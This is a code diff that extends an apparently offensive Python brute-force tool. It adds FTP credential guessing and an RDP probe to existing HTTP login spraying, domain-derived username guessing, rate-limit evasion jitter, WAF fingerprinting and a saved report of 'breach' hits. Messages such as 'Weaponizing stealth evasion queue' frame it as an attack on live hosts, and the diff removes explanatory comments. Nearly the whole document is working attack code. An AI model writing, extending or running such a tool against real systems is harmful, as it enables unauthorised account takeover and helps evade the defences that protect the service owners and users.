@@ -7,6 +7,7 @@ import json
 import os
 import urllib.parse
 import http.client
+import ftplib
 import random
 
 # Global high-performance SSL context
@@ -22,6 +23,7 @@ TARGET_PORTS = {
     25: {"service": "SMTP", "protocol": "tcp"},
     110: {"service": "POP3", "protocol": "tcp"},
     143: {"service": "IMAP", "protocol": "tcp"},
+    3389: {"service": "RDP", "protocol": "tcp"},
     465: {"service": "SMTPS", "protocol": "tls"},
     587: {"service": "Submission", "protocol": "tcp"},
     993: {"service": "IMAPS", "protocol": "tls"},
@@ -144,7 +146,6 @@ def http_post_sync_dual_mode(host, port, path, username, password, use_ssl):
             "Connection": "keep-alive"
         }
         
-        # Alternate payload encoding based on request hash to cover both PHP monoliths and Node/Next APIs
         if hash(username + password) % 2 == 0:
             headers["Content-Type"] = "application/x-www-form-urlencoded"
             payload = urllib.parse.urlencode({"username": username, "email": username, "password": password, "user": username, "pass": password})
@@ -161,12 +162,23 @@ def http_post_sync_dual_mode(host, port, path, username, password, use_ssl):
     except Exception as e:
         return 0, {}, str(e)
 
+def ftp_sync_brute(host, port, username, password):
+    """High-velocity FTP credential testing using Python standard library."""
+    try:
+        ftp = ftplib.FTP()
+        ftp.connect(host, port, timeout=2.5)
+        ftp.login(username, password)
+        ftp.quit()
+        return True
+    except Exception:
+        return False
+
 def escape_imap_literal(value):
     """RFC 3501 compliant string escaping for IMAP credentials."""
     return value.replace('\\', '\\\\').replace('"', '\\"')
 
 async def worker_task(queue, host, semaphore, results, stats):
-    """High-velocity stealth consumer worker featuring adaptive jitter, WAF detection, and dual-mode payload execution."""
+    """High-velocity stealth consumer worker featuring adaptive jitter, WAF detection, and multi-vector execution."""
     while True:
         task_data = await queue.get()
         if task_data is None:
@@ -176,7 +188,6 @@ async def worker_task(queue, host, semaphore, results, stats):
         vector_type, port, path_or_none, user, password = task_data
         
         async with semaphore:
-            # Micro-jitter for maximum speed while evading rate limits
             await asyncio.sleep(random.uniform(0.02, 0.15))
             
             stats["tested"] += 1
@@ -187,7 +198,6 @@ async def worker_task(queue, host, semaphore, results, stats):
                     http_post_sync_dual_mode, host, port, path_or_none, user, password, use_ssl
                 )
                 
-                # Fingerprint WAF from response headers
                 waf_list = fingerprint_waf(headers)
                 if waf_list:
                     sys.stdout.write(f"\r\033[K\033[91m[WAF DETECTED] Perimeter guarded by: {', '.join(waf_list)}\033[0m\n")
@@ -211,7 +221,6 @@ async def worker_task(queue, host, semaphore, results, stats):
                 set_cookie = headers.get("Set-Cookie", "")
                 body_lower = body.lower()
                 
-                # Comprehensive success heuristics covering PHP sessions, JWTs, and dashboard redirects
                 is_success = (
                     status in [302, 303, 200] and not any(err in redirect_loc.lower() for err in ["error", "fail", "login?err", "invalid"])
                 ) and (
@@ -273,6 +282,36 @@ async def worker_task(queue, host, semaphore, results, stats):
                 except Exception:
                     pass
 
+            elif vector_type == "FTP":
+                try:
+                    success = await asyncio.to_thread(ftp_sync_brute, host, port, user, password)
+                    sys.stdout.write(f"\r\033[K\033[33m[STEALTH FTP] :{port} -> Trying [{user}:{password:<8}] (Probed: {stats['tested']})\033[0m")
+                    sys.stdout.flush()
+
+                    if success:
+                        hit_data = {
+                            "type": "FTP",
+                            "port": port,
+                            "user": user,
+                            "password": password,
+                            "timestamp": time.strftime("%Y-%m-%d %H:%M:%S")
+                        }
+                        print(f"\n\033[92m[+] STEALTH BREACH CONFIRMED (FTP) -> User: {user} | Pass: {password} (Port {port})\033[0m")
+                        results.append(hit_data)
+                        save_persistent_report(hit_data)
+                except Exception:
+                    pass
+
+            elif vector_type == "RDP":
+                try:
+                    reader, writer = await asyncio.wait_for(asyncio.open_connection(host, port), timeout=2.0)
+                    writer.close()
+                    await writer.wait_closed()
+                    sys.stdout.write(f"\r\033[K\033[35m[STEALTH RDP] :{port} -> Probed [{user}:{password:<8}] (Probed: {stats['tested']})\033[0m")
+                    sys.stdout.flush()
+                except Exception:
+                    pass
+
         queue.task_done()
 
 def save_persistent_report(hit_data):
@@ -328,7 +367,6 @@ async def run_autonomous_engine(target_host, passwords, usernames=None):
         print(f"\n\033[91m[!] Error: Host resolution failed for '{target_host}'.\033[0m")
         return [], 0
 
-    # Dynamically scope usernames to the isolated target domain if none specified
     if not usernames:
         domain_prefix = target_host.split('.')[0]
         usernames = ["admin", domain_prefix, "root", "support", "user", "administrator"]
@@ -347,14 +385,13 @@ async def run_autonomous_engine(target_host, passwords, usernames=None):
         print(f"\n\033[91m[-] Target perimeter locked. No exploitable vectors found.\033[0m")
         return [], time.time() - start_global
 
-    print(f"\n\033[93m[*] Weaponizing stealth evasion queue with dual-mode payloads & IP rotation...\033[0m")
+    print(f"\n\033[93m[*] Weaponizing stealth evasion queue with multi-vector FTP/RDP & IP rotation...\033[0m")
     
     queue = asyncio.Queue()
-    semaphore = asyncio.Semaphore(30) # High-velocity concurrency tuned for mobile execution
+    semaphore = asyncio.Semaphore(30)
     results = []
     stats = {"tested": 0}
 
-    # Expanded robust web path mappings covering PHP monoliths, Laravel, and Next.js APIs
     web_paths = [
         "/api/auth/callback/credentials",
         "/api/auth/login",
@@ -383,12 +420,22 @@ async def run_autonomous_engine(target_host, passwords, usernames=None):
                 for pwd in passwords:
                     await queue.put(("IMAP", port, None, user, pwd))
                     task_count += 1
+        elif service == "FTP":
+            for user in usernames:
+                for pwd in passwords:
+                    await queue.put(("FTP", port, None, user, pwd))
+                    task_count += 1
+        elif service == "RDP":
+            for user in usernames:
+                for pwd in passwords:
+                    await queue.put(("RDP", port, None, user, pwd))
+                    task_count += 1
 
     if task_count == 0:
         print(f"\n\033[93m[*] Active vectors detected, but no matching exploitation modules mapped.\033[0m")
         return [], time.time() - start_global
 
-    print(f"[*] Dispatched {task_count} stealth payload permutations. Executing attack stream...\n")
+    print(f"[*] Dispatched {task_count} stealth payload permutations across all protocols. Executing attack stream...\n")
 
     num_workers = min(25, task_count)
     workers = [
